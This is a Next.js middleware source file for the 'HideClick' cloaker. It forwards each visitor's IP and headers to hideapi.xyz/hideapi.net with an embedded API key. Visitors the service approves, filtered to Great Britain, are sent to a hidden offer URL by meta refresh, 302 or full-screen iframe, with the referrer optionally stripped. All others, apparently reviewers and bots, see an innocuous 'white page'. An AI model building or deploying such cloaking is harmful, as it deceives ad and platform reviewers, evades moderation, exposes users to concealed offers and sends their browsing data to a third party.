import { NextRequest, NextResponse } from 'next/server';

/* ============================================================
 *  HideClick Cloaker — JS version for Vercel (Next.js 16+)
 *  Ported from kloaka.php (HideClick v20240129)
 *
 *  Logic:
 *    1. Collect visitor headers (emulate PHP $_SERVER)
 *    2. Send them + filter config to HideClick API
 *    3. API returns { action: "allow" } → redirect to OFFER
 *       Otherwise → show white page (Next.js app)
 * ============================================================ */

// ==================== SETTINGS ====================
// Edit these the same way you edited $HCSET in kloaka.php

const HCSET = {
  OFFER_PAGE: process.env.HC_OFFER_PAGE || 'https://netventra.com/HB1FwQch',
  WHITE_PAGE: '/',

  // meta | 302 | iframe | metaprivacy | 302privacy | iframeprivacy
  OFFER_METHOD: 'meta',

  /* COUNTRY FILTERS */
  FILTER_GEO_MODE: 'allow',
  FILTER_GEO_LIST: 'gb',

  /* DEVICE FILTERS */
  FILTER_DEV_MODE: '',
  FILTER_DEV_LIST: '',

  /* UTM FILTERS */
  FILTER_UTM_MODE: '',
  FILTER_UTM_LIST: '',

  /* REFERER FILTERS */
  FILTER_REF_MODE: '',
  FILTER_REF_LIST: '',
  FILTER_NOREF: '',

  /* NETWORK FILTERS */
  FILTER_NET_MODE: '',
  FILTER_NET_LIST: '',

  /* BROWSER FILTERS */
  FILTER_BRO_MODE: '',
  FILTER_BRO_LIST: '',

  /* SESSION & MISC */
  USE_SESSIONS: true,
  BLOCK_DDOS: false,
  DELAY_START: 0,
  DELAY_PERMANENT: false,
  DELAY_NONBOT: false,
  DISABLE_CACHE: false,

  VERSION: 20240129,
  WHITE_METHOD: 'curl',
  mlSet: '',
  groupByDomain: '',
  stage: '',
};

const API_KEY = process.env.HC_API_KEY || 'v11b4791cb3fe5415794ed567993722a47';
const API_TIMEOUT_MS = 10_000;

const API_ENDPOINTS = [
  'http://api.hideapi.xyz/basic',
  'http://hideapi.net/basic',
];

// ==================== HELPERS ====================

function getClientIP(req: NextRequest): string {
  // Cloudflare
  const cfIP = req.headers.get('cf-connecting-ip');
  if (cfIP) return cfIP;

  // Standard proxy headers
  const realIP = req.headers.get('x-real-ip');
  if (realIP) return realIP;

  const fwd = req.headers.get('x-forwarded-for');
  if (fwd) return fwd.split(',')[0].trim();

  return '127.0.0.1';
}

function buildServerHeaders(req: NextRequest): Record<string, string> {
  const h: Record<string, string> = {};

  // Convert browser headers → PHP $_SERVER format
  req.headers.forEach((value: string, key: string) => {
    h['HTTP_' + key.toUpperCase().replace(/-/g, '_')] = value;
  });

  const ip = getClientIP(req);
  h['REMOTE_ADDR'] = ip;
  h['REMOTE_PORT'] = '0';
  h['REQUEST_URI'] = req.nextUrl.pathname + req.nextUrl.search;
  h['REQUEST_METHOD'] = req.method;
  h['SCRIPT_NAME'] = req.nextUrl.pathname;
  h['HTTP_HOST'] = req.headers.get('host') || req.nextUrl.host;
  h['SERVER_PORT'] = req.nextUrl.protocol === 'https:' ? '443' : '80';
  h['path'] = req.nextUrl.pathname + req.nextUrl.search;

  if (req.nextUrl.protocol === 'https:') {
    h['HTTP_HTTPS'] = '1';
    h['HTTPS'] = 'on';
  }

  return h;
}

function buildApiParams(
  ip: string,
  cfg: typeof HCSET,
  skipReason: string,
  banReason: string,
): string {
  const p = new URLSearchParams();

  p.set('ip', ip);
  p.set('port', '0');
  p.set('key', API_KEY);
  p.set('sign', 'v2-350210736');
  p.set('js', 'false');
  p.set('stage', cfg.stage);

  if (cfg.VERSION) p.set('version', String(cfg.VERSION));
  if (cfg.WHITE_METHOD) p.set('wmet', cfg.WHITE_METHOD);
  if (cfg.OFFER_METHOD) p.set('omet', cfg.OFFER_METHOD);
  if (skipReason) p.set('skipReason', skipReason);
  if (banReason) p.set('banReason', banReason);
  if (cfg.DISABLE_CACHE) p.set('cache', String(cfg.DISABLE_CACHE));
  if (cfg.mlSet) p.set('mlSet', cfg.mlSet);
  if (cfg.WHITE_PAGE) p.set('white', cfg.WHITE_PAGE);
  if (cfg.OFFER_PAGE) p.set('offer', cfg.OFFER_PAGE);
  if (cfg.DELAY_START) p.set('delay', String(cfg.DELAY_START));
  if (cfg.DELAY_PERMANENT) p.set('perm', String(cfg.DELAY_PERMANENT));
  if (cfg.DELAY_NONBOT) p.set('DELAY_NONBOT', String(cfg.DELAY_NONBOT));

  p.set('FILTER_GEO_MODE', cfg.FILTER_GEO_MODE);
  p.set('FILTER_GEO_LIST', cfg.FILTER_GEO_LIST);
  p.set('FILTER_DEV_MODE', cfg.FILTER_DEV_MODE);
  p.set('FILTER_DEV_LIST', cfg.FILTER_DEV_LIST);
  p.set('FILTER_UTM_MODE', cfg.FILTER_UTM_MODE);
  p.set('FILTER_UTM_LIST', cfg.FILTER_UTM_LIST);
  p.set('FILTER_REF_MODE', cfg.FILTER_REF_MODE);
  p.set('FILTER_REF_LIST', cfg.FILTER_REF_LIST);
  p.set('FILTER_NOREF', cfg.FILTER_NOREF);
  p.set('FILTER_NET_MODE', cfg.FILTER_NET_MODE);
  p.set('FILTER_NET_LIST', cfg.FILTER_NET_LIST);
  p.set('FILTER_BRO_MODE', cfg.FILTER_BRO_MODE);
  p.set('FILTER_BRO_LIST', cfg.FILTER_BRO_LIST);
  if (cfg.USE_SESSIONS) p.set('USE_SESSIONS', String(cfg.USE_SESSIONS));
  if (cfg.BLOCK_DDOS) p.set('BLOCK_DDOS', String(cfg.BLOCK_DDOS));
  if (cfg.groupByDomain) p.set('groupByDomain', cfg.groupByDomain);

  return p.toString();
}

async function callHideApi(
  params: string,
  body: string,
): Promise<string | null> {
  for (const endpoint of API_ENDPOINTS) {
    try {
      const ctrl = new AbortController();
      const timer = setTimeout(() => ctrl.abort(), API_TIMEOUT_MS);

      const res = await fetch(`${endpoint}?${params}`, {
        method: 'POST',
        body,
        signal: ctrl.signal,
      });

      clearTimeout(timer);

      if (res.ok) {
        return await res.text();
      }
    } catch {
      continue;
    }
  }

  return null;
}

function buildOfferUrl(
  base: string,
  req: NextRequest,
  status: Record<string, string>,
): string {
  let url = base;

  const qs = req.nextUrl.searchParams.toString();
  if (qs) url += (url.includes('?') ? '&' : '?') + qs;

  if (status?.geo) {
    url = url.replace(/\{hc_geo\}/g, status.geo);
    url = url.replace(/%7Bhc_geo%7D/gi, status.geo);
  }
  if (status?.uid) {
    url = url.replace(/\{hc_uid\}/g, status.uid);
    url = url.replace(/%7Bhc_uid%7D/gi, status.uid);
  }
  const ref = req.headers.get('referer');
  if (ref) {
    url = url.replace(/\{hc_ref\}/g, encodeURIComponent(ref));
    url = url.replace(/%7Bhc_ref%7D/gi, encodeURIComponent(ref));
  }

  return url;
}

async function makeSessionHash(req: NextRequest): Promise<string> {
  const raw =
    getClientIP(req) +
    (req.headers.get('user-agent') || '') +
    (req.headers.get('host') || '');
  const buf = await crypto.subtle.digest(
    'SHA-256',
    new TextEncoder().encode(raw),
  );
  return Array.from(new Uint8Array(buf))
    .map((b) => b.toString(16).padStart(2, '0'))
    .join('')
    .substring(0, 32);
}

function serveOffer(
  url: string,
  method: string,
  sessionCookie: string,
): NextResponse {
  let res: NextResponse;
  const isPrivacy = method.endsWith('privacy');

  if (method.startsWith('302')) {
    res = NextResponse.redirect(url, 302);
  } else if (method.startsWith('iframe')) {
    res = new NextResponse(
      `<!DOCTYPE html><html><head><title></title><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"/></head><body style="margin:0;padding:0"><iframe src="${url}" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:999999" allowfullscreen></iframe></body></html>`,
      {
        status: 200,
        headers: { 'Content-Type': 'text/html;charset=utf-8' },
      },
    );
  } else {
    // meta refresh (default)
    res = new NextResponse(
      `<!DOCTYPE html><html><head><meta http-equiv="Refresh" content="0;URL=${url}"></head><body></body></html>`,
      {
        status: 200,
        headers: { 'Content-Type': 'text/html;charset=utf-8' },
      },
    );
  }

  if (isPrivacy) {
    res.headers.set('Referrer-Policy', 'no-referrer');
    res.headers.set('Content-Security-Policy', 'referrer no-referrer');
  }

  res.cookies.set('hcsid', sessionCookie, { maxAge: 604800, path: '/' });
  return res;
}

// ==================== PROXY (Next.js 16+ convention) ====================

export async function proxy(request: NextRequest) {
  const pathname = request.nextUrl.pathname;

  // Skip static assets by file extension
  if (
    /\.(ico|svg|png|jpe?g|gif|webp|avif|css|js|mjs|woff2?|ttf|eot|map|json|xml|txt|mp3|wav|ogg|webm|mp4|pdf|html?)$/i.test(
      pathname,
    )
  ) {
    return NextResponse.next();
  }

  // Skip known static paths
  if (
    pathname.startsWith('/images/') ||
    pathname === '/robots.txt' ||
    pathname.startsWith('/sitemap')
  ) {
    return NextResponse.next();
  }

  // --- Cloaker logic ---

  const cfg = { ...HCSET };

  // Dynamic geo override (?utm_allow_geo=xx)
  const utmGeo = request.nextUrl.searchParams.get('utm_allow_geo');
  if (utmGeo && /^[a-zA-Z]{2}$/.test(utmGeo)) {
    cfg.FILTER_GEO_LIST = utmGeo;
    cfg.FILTER_GEO_MODE = 'allow';
  }

  // Session cookie check
  let skipReason = '';
  if (request.cookies.get('hcsid')?.value && cfg.USE_SESSIONS) {
    skipReason = 'cookie';
  }

  const ip = getClientIP(request);
  const headers = buildServerHeaders(request);
  const headersJson = JSON.stringify(headers);
  const params = buildApiParams(ip, cfg, skipReason, '');

  try {
    const raw = await callHideApi(params, headersJson);

    if (!raw) {
      return NextResponse.next();
    }

    let status: Record<string, string>;
    try {
      status = JSON.parse(raw);
    } catch {
      return NextResponse.next();
    }

    if (status?.action === 'allow') {
      const offerUrl = buildOfferUrl(cfg.OFFER_PAGE, request, status);
      const hash = await makeSessionHash(request);
      return serveOffer(offerUrl, cfg.OFFER_METHOD, hash);
    }
  } catch {
    // API unreachable — safe fallback to white page
  }

  // White page = serve Next.js app
  return NextResponse.next();
}

// ==================== ROUTE MATCHER ====================

export const config = {
  matcher: ['/((?!_next|api).*)'],
};
